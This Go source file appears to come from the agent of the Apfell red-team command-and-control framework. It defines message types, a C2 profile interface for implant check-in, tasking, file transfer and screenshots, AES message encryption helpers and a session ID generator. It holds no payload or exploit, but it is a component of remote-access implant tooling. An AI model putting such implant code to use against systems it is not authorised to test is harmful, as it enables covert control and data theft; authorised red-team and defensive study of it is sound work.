package profiles

import (
	"crypto/rsa"
	"encoding/base64"
	"pkg/utils/crypto"

	"pkg/utils/structs"
)


const (
	//CheckInMsg - Messages for apfell
	CheckInMsg = 0
	//EKE - Messages for apfell EKE AES
	EKE = 1
	//AES - Messages for apfell static AES
	AES = 2
	//TaskMsg - Messages for apfell tasks
	TaskMsg = 3
	//ResponseMsg - Messages for apfell task responses
	ResponseMsg = 4
	//FileMsg - Messages for apfell file downloads/uploads
	FileMsg = 5
	// ID Type for UUID
	UUIDType = 6
	// ID Type for ApfellID
	ApfellIDType = 7
	// ID Type for FileID
	FileIDType = 8
	// ID Type for session ID
	SESSIDType = 9
	// ID Type for Task ID
	TASKIDType = 10
)

//Profile - Primary interface for apfell C2 profiles
type Profile interface {
	// CheckIn method for sending the initial checkin to the server
	CheckIn(ip string, pid int, user string, host string) interface{}
	// GetTasking method for retrieving the next task from apfell
	GetTasking() interface{}
	// Post a task response to the server
	PostResponse(task structs.Task, output string) []byte
	// Start EKE key negotiation for encrypted comms
	NegotiateKey() string
	// C2 profile implementation for downloading files
	SendFile(task structs.Task, params string) structs.ThreadMsg
	// C2 Profile implementation to get a file with specified id
	GetFile(fileid string) []byte
	// C2 profile helper function to send file chunks for file downloads and screenshots
	SendFileChunks(task structs.Task, data []byte) structs.ThreadMsg

	Header() string
	SetHeader(hostname string)
	URL() string
	SetURL(url string)
	SetURLs(urls []string)
	SleepInterval() int
	SetSleepInterval(interval int)
	C2Commands() []string
	SetC2Commands(commands []string)
	XKeys() bool
	SetXKeys(exchangingkeys bool)
	SetUserAgent(ua string)
	GetUserAgent() string
	ApfID() string
	SetApfellID(newID string)
	UniqueID() string
	SetUniqueID(newUUID string)
	AesPreSharedKey() string
	SetAesPreSharedKey(newkey string)
	RsaKey() *rsa.PrivateKey
	SetRsaKey(newKey *rsa.PrivateKey)
}

func NewInstance() interface{} {
	return newProfile()
}

func EncryptMessage(msg []byte, k string) []byte {
	key, _ := base64.StdEncoding.DecodeString(k)
	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
}

func DecryptMessage(msg []byte, k string) []byte {
	key, _ := base64.StdEncoding.DecodeString(k)
	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
	return crypto.AesDecrypt(key, decMsg)
}

func GenerateSessionID() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = letterBytes[seededRand.Intn(len(letterBytes))]
	}
	return string(b)
}